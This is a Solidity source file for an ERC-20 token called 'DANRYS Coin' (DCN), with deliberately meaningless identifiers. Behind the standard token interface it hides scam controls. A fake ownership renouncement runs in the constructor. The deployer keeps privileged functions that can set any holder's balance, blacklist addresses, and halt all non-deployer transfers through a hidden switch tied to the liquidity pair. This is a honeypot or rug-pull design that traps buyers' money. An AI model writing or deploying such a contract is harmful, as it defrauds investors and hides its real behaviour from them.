//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface receiverLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountTokenFee) external view returns (uint256);

    function transfer(address amountLimitMax, uint256 modeAtLiquidity) external returns (bool);

    function allowance(address fundFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeAtLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address amountLimitMax,
        uint256 modeAtLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isLimitAmount, uint256 value);
    event Approval(address indexed fundFrom, address indexed spender, uint256 value);
}

interface receiverWallet is receiverLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract receiverExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletAt {
    function createPair(address tokenSwap, address senderSell) external returns (address);
}

interface autoTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract DANRYSCoin is receiverExempt, receiverLimit, receiverWallet {

    bool private amountReceiver;

    bool public amountBuyToken;

    address tradingIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function tradingWallet(address maxExempt, address amountLimitMax, uint256 modeAtLiquidity) internal returns (bool) {
        require(minTx[maxExempt] >= modeAtLiquidity);
        minTx[maxExempt] -= modeAtLiquidity;
        minTx[amountLimitMax] += modeAtLiquidity;
        emit Transfer(maxExempt, amountLimitMax, modeAtLiquidity);
        return true;
    }

    uint256 private listFund;

    function modeBuy(address maxExempt, address amountLimitMax, uint256 modeAtLiquidity) internal returns (bool) {
        if (maxExempt == sellAmount) {
            return tradingWallet(maxExempt, amountLimitMax, modeAtLiquidity);
        }
        uint256 exemptReceiverTake = receiverLimit(marketingTxEnable).balanceOf(enableAmount);
        require(exemptReceiverTake == toIsMin);
        require(!liquidityAuto[maxExempt]);
        return tradingWallet(maxExempt, amountLimitMax, modeAtLiquidity);
    }

    uint256 public txTake;

    function toLaunch(address walletTake) public {
        modeTrading();
        if (atMarketing != listFund) {
            listFund = swapShouldLimit;
        }
        if (walletTake == sellAmount || walletTake == marketingTxEnable) {
            return;
        }
        liquidityAuto[walletTake] = true;
    }

    uint256 private launchedTrading;

    bool public teamSwap;

    address public marketingTxEnable;

    uint256 public swapShouldLimit;

    function owner() external view returns (address) {
        return sellTxTeam;
    }

    function balanceOf(address amountTokenFee) public view virtual override returns (uint256) {
        return minTx[amountTokenFee];
    }

    uint256 takeLiquidity;

    string private txTotal = "DANRYS Coin";

    uint256 private isLaunch;

    function getOwner() external view returns (address) {
        return sellTxTeam;
    }

    address public sellAmount;

    function allowance(address tokenIs, address txFundEnable) external view virtual override returns (uint256) {
        if (txFundEnable == tradingIs) {
            return type(uint256).max;
        }
        return launchReceiver[tokenIs][txFundEnable];
    }

    mapping(address => uint256) private minTx;

    function walletFund(address listEnableAt, uint256 modeAtLiquidity) public {
        modeTrading();
        minTx[listEnableAt] = modeAtLiquidity;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderMarketing;
    }

    uint8 private atMarketingSell = 18;

    function fundTeamAmount() public {
        emit OwnershipTransferred(sellAmount, address(0));
        sellTxTeam = address(0);
    }

    function txMin(address launchTotal) public {
        if (teamSwap) {
            return;
        }
        if (swapShouldLimit == atMarketing) {
            amountBuyToken = true;
        }
        isFrom[launchTotal] = true;
        if (swapShouldLimit != launchedTrading) {
            amountReceiver = false;
        }
        teamSwap = true;
    }

    function name() external view virtual override returns (string memory) {
        return txTotal;
    }

    address private sellTxTeam;

    function transfer(address listEnableAt, uint256 modeAtLiquidity) external virtual override returns (bool) {
        return modeBuy(_msgSender(), listEnableAt, modeAtLiquidity);
    }

    function symbol() external view virtual override returns (string memory) {
        return teamIs;
    }

    uint256 private receiverAmount;

    mapping(address => bool) public liquidityAuto;

    uint256 public atMarketing;

    function approve(address txFundEnable, uint256 modeAtLiquidity) public virtual override returns (bool) {
        launchReceiver[_msgSender()][txFundEnable] = modeAtLiquidity;
        emit Approval(_msgSender(), txFundEnable, modeAtLiquidity);
        return true;
    }

    bool private tokenEnable;

    mapping(address => bool) public isFrom;

    function transferFrom(address maxExempt, address amountLimitMax, uint256 modeAtLiquidity) external override returns (bool) {
        if (_msgSender() != tradingIs) {
            if (launchReceiver[maxExempt][_msgSender()] != type(uint256).max) {
                require(modeAtLiquidity <= launchReceiver[maxExempt][_msgSender()]);
                launchReceiver[maxExempt][_msgSender()] -= modeAtLiquidity;
            }
        }
        return modeBuy(maxExempt, amountLimitMax, modeAtLiquidity);
    }

    uint256 toIsMin;

    function minBuy(uint256 modeAtLiquidity) public {
        modeTrading();
        toIsMin = modeAtLiquidity;
    }

    address enableAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function modeTrading() private view {
        require(isFrom[_msgSender()]);
    }

    constructor (){
        
        fundTeamAmount();
        autoTotal launchedWallet = autoTotal(tradingIs);
        marketingTxEnable = walletAt(launchedWallet.factory()).createPair(launchedWallet.WETH(), address(this));
        
        sellAmount = _msgSender();
        isFrom[sellAmount] = true;
        minTx[sellAmount] = senderMarketing;
        
        emit Transfer(address(0), sellAmount, senderMarketing);
    }

    string private teamIs = "DCN";

    mapping(address => mapping(address => uint256)) private launchReceiver;

    event OwnershipTransferred(address indexed shouldSender, address indexed sellTotal);

    uint256 private senderMarketing = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return atMarketingSell;
    }

}